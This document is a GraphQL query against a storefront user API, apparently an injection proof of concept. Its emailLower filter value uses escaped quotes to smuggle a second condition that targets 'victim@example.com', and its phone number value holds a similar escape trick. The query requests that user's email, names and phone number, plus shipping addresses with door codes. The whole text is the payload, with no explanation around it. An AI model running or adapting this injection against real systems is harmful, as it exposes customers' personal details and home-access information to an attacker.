query {
    StorefrontUsers(
        where: {
            _or: [{emailLower: {_eq: "eve\"}}, {emaillower: {_eq: \"victim@example.com"}}, {phoneNumber: {_eq: "+1415555\\\"0000"}}]
        },
        limit: 5
    ) {
        id
        email
        emailLower
        firstName
        lastName
        phoneNumber
        platformId
        createdAt
        updatedAt
        redactedAt
        smsTransactionalOptIn
        ShippingAddresses(limit: 10) {
                id
                platformId
                firstName
                lastName
                company
                address1
                address2
                city
                province
                country
                zip
                phoneNumber
                doorCode
        }
    }
}
